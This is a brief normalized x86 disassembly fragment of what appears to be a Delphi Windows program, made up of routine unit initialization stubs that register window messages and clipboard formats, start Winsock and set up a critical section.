mov [ fs : eax ] edx
push sub_48e329
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_48e322
jmp sub_404de4
sub_48e329
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_48e389
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_48e392
jmp sub_404de4
j_sub_48e389
jmp sub_48e389
sub_48e399
pop ecx
pop ebp
retn
j_sub_404de4#6
jmp sub_404de4
sub_48e3dc
pop ebp
retn
sub_48f098
sub [ rw-data ] 0x1
jae r-xdata
retn
xor eax eax
mov [ rw-data ] eax
sub_48f11e
jmp sub_404de4
sub_48f125
pop ebp
retn
j_sub_404de4#5
jmp sub_404de4
sub_48f1ec
pop ebp
retn
sub_48f1f0
sub [ rw-data ] 0x1
retn
j_sub_404de4#4
jmp sub_404de4
sub_48f288
pop ebp
retn
sub_48f28c
sub [ rw-data ] 0x1
retn
sub_48f294
sub [ rw-data ] 0x1
retn
sub_48f3f0
sub [ rw-data ] 0x1
retn
sub_48f3f8
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42e84c
sub_48f408
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ee3c
mov [ rw-data ] eax
sub_48f424
sub [ rw-data ] 0x1
retn
sub_48f42c
sub [ rw-data ] 0x1
retn
sub_48f4bc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ r-xdata ]
call sub_4190d4
mov edx [ r-xdata ]
mov eax [ sub_430974 ]
call sub_419120
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
sub_48f540
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_48f595
add [ eax ] al
add [ ebx + 0x499bec2d ] al
add [ ecx ] al
jae r-xdata
retn
call sub_431cf4
sub_48f5a8
sub [ rw-data ] 0x1
retn
sub_48f68f
jmp sub_404de4
sub_48f696
pop ebp
retn
sub_48f6a7
add [ ebx + 0x499c582d ] al
add [ ecx ] al
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419120
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419120
j_sub_404de4#3
jmp sub_404de4
sub_48f761
pop ebp
retn
sub_48f764
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419120
sub_48f7bc
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_4609ac
sub_48f7cc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4621dc
mov [ rw-data ] eax
sub_48f7e8
sub [ rw-data ] 0x1
retn
sub_48f7f0
sub [ rw-data ] 0x1
retn
sub_48f7f8
sub [ rw-data ] 0x1
retn
sub_48f800
sub [ rw-data ] 0x1
retn
sub_48f808
sub [ rw-data ] 0x1
retn
sub_48f810
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
push eax
push 0x101
call WSAStartup
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov edx [ rw-data ]
mov [ edx ] eax
sub_48f840
sub [ rw-data ] 0x1
retn
sub_48f848
sub [ rw-data ] 0x1
retn
sub_48f850
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ rw-data ] eax
push rw-data
call InitializeCriticalSection
sub_48f878
sub [ rw-data ] 0x1
retn
sub_48f880
sub [ rw-data ] 0x1
retn
j_sub_404de4#2
jmp sub_404de4
j_sub_404b30
jmp sub_404b30
j_sub_404de4
jmp sub_404de4
sub_49065d
pop edi
pop esi
pop ebx
call sub_405388
